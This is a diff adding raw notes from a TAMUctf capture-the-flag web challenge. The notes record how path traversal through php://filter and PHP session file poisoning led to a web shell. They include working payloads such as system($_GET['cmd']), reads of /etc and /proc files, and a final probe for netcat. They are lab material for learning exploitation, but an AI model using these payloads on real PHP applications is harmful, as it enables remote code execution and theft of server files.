@@ -1,0 +1,108 @@
+data://text/plain,&LT;?php echo exec(id);?&GT;
+
+POST /index.php HTTP/1.1
+Host: filestorage.tamuctf.com
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://filestorage.tamuctf.com/
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 79
+Connection: close
+Cookie: PHPSESSID=ue8ndg1vdv0a40l76jobindh8n
+Upgrade-Insecure-Requests: 1
+name=data%3A%2F%2Ftext%2Fplain%2C%26LT%3B%3Fphp+echo+exec%28id%29%3B%3F%26GT%3B
+
+
+https://hub.docker.com/r/itsthenetwork/alpine-apache
+
+POST /index.php?file=php://filter//../../../../../../../../../var/www/localhost/htdocs/files/beemovie.txt  
+
+POST /index.php?file=php://filter//../../../../../../../../../etc/apache2/httpd.conf - config file
+
+POST /index.php?file=/../../../../../../../../../proc/version - Linux version 4.14.171-105.231.amzn1.x86_64 (mockbuild@koji-pdx-corp-builder-64005) (gcc version 7.2.1 20170915 (Red Hat 7.2.1-2) (GCC)) #1 SMP Thu Feb 27 23:49:15 UTC 2020
+
+POST /index.php?file=/../../../../../../../../../etc/issue - Welcome to Alpine Linux 3.11 Kernel
+
+this gave us commented out gzip data?!?!?
+
+POST /index.php?file=/../../../../../../../bin/ls HTTP/1.1
+Host: filestorage.tamuctf.com
+User-Agent: <?php echo exec($_POST["file"]); ?>
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://filestorage.tamuctf.com/index.php?name=<%3fphp+exec($_POST["file"])%3b+%3f/>
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 0
+Cookie: PHPSESSID=p4lcl7ughal0m7buvrd74r5kcu
+Upgrade-Insecure-Requests: 1
+
+
+
+_________________________
+VERY INTERESTING
+_________________________
+HTTP/1.1 200 OK
+Server: nginx/1.16.1
+Date: Sat, 21 Mar 2020 09:47:53 GMT
+Content-Type: text/html; charset=UTF-8
+Content-Length: 402
+Connection: close
+X-Powered-By: PHP/7.3.15
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+
+
+
+<html>
+	<head>
+		<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
+	</head>
+	<body>
+	<a class="btn btn-primary" href="index.php" role="button">ð¡ Go back</a><br>name|s:47:"name=data://text/plain,&LT;? php phpinfo();?&GT";	</body>
+</html>
+
+
+______________
+POC
+____________
+
+submit name as <?php echo system('ls');?> and get the session id then submit the request to get POC
+ 
+
+POST /index.php?file=php://filter//../../../../../../../proc/self/fd/9 HTTP/1.1
+Host: filestorage.tamuctf.com
+Referer: http://filestorage.tamuctf.com/index.php
+Cookie: PHPSESSID=fdh3q63ba831mgbbhjhh9857o1
+
+RES:
+name|s:26:"files
+index.html
+index.php
+index.php";	
+
+
+change the name to: <?php echo system($_GET["cmd"]);?> and we get a web shell
+
+tried find / -name "flag*" and we get:
+name|s:34:"/sys/devices/pnp0/00:06/tty/ttyS0/flags
+/sys/devices/platform/serial8250/tty/ttyS2/flags
+/sys/devices/platform/serial8250/tty/ttyS3/flags
+/sys/devices/platform/serial8250/tty/ttyS1/flags
+/sys/devices/virtual/net/eth0/flags
+/sys/devices/virtual/net/lo/flags
+/proc/sys/kernel/sched_domain/cpu0/domain0/flags
+/proc/sys/kernel/sched_domain/cpu1/domain0/flags
+/flag_is_here
+/flag_is_here/flag.txt
+/flag_is_here/flag.txt";
+
+final command is cat /flag_is_here/flag.txt and we get
+gigem{535510n_f1l3_p0150n1n6}
+
+
+
+POST /index.php?file=php://filter//../../../../../../../proc/self/fd/9&cmd=which+nc
